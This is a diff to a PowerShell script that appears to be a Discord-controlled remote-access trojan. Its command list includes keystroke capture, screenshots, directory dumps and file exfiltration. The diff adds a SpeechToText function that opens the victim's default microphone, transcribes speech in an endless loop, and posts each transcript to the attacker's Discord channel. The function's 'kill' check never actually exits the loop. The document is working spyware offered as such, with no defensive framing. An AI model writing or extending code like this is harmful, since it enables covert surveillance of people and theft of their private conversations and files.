@@ -53,6 +53,7 @@ Extra-Info    : Extra commands information
 Pause-Session   : Kills this session and restarts
 Toggle-Errors    : Toggle error messages to chat
 Folder-Tree    : Gets Dir tree and sends it zipped
+SpeechToText  : Send audio transcript to Discord 
 Screenshot   : Sends a screenshot of the desktop
 Key-Capture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see 'Extra-Info' for more)
@@ -135,6 +136,29 @@ if (Test-Path -Path $path){
         Write-Output "File Upload Complete: $path"
     }
 }else{Write-Host "File Not Found: $path"}
+}
+
+Function SpeechToText {
+$contents = "$tick $env:COMPUTERNAME $tick Transcription Started.. (Stop with Killswitch)"
+Post-Message
+Add-Type -AssemblyName System.Speech
+$speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
+$grammar = New-Object System.Speech.Recognition.DictationGrammar
+$speech.LoadGrammar($grammar)
+$speech.SetInputToDefaultAudioDevice()
+while ($true) {
+    $result = $speech.Recognize()
+    if ($result) {
+        $results = $result.Text
+        $contents = "$results"
+        Post-Message
+    }
+    $messages=ReceiveMSG
+    if ($messages.message.text -contains "kill") {
+        $contents = "$comp $env:COMPUTERNAME $closed Transcription Killed"
+        Post-Message
+    }
+}
 }
 
 Function Exfiltrate {
